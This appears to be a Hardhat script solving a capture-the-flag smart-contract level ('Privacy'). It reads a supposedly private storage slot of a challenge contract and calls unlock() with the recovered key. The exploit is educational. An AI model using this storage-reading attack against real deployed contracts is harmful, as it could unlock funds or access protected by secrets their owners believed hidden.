import { ethers } from "hardhat";
import { Privacy__factory, Helper13__factory } from "../typechain-types";

async function main() {
  // Reach the top

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0xd073B7531B1d3840c3F848892744F09846120f9E";

  let privacy = new Privacy__factory(deployer).attach(contract);
  let helper = await new Helper13__factory(deployer).deploy();

  // bool public locked = true;            --> 0 slot
  // uint256 public ID = block.timestamp;  --> 1 slot
  // uint8 private flattening = 10;           ||
  // uint8 private denomination = 255;        || --> this packs into one slot (2) which returns '0x0000000000000000000000000000000000000000000000000000000085d4ff0a'
  // uint16 private awkwardness = uint16(now);||        which is arranged from right to left 10, 255, some timestamp => 0xa, 0xff,  0x85d4
  // bytes32[3] private data;              --> 3,4,5 slots

  // get data[2]
  let data = await ethers.provider.getStorageAt(contract, 5);

  // cast to bytes16
  let data_bytes16 = await helper.getBytes16(data);

  tx = await privacy.unlock(data_bytes16, { gasLimit: 100_000 });
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
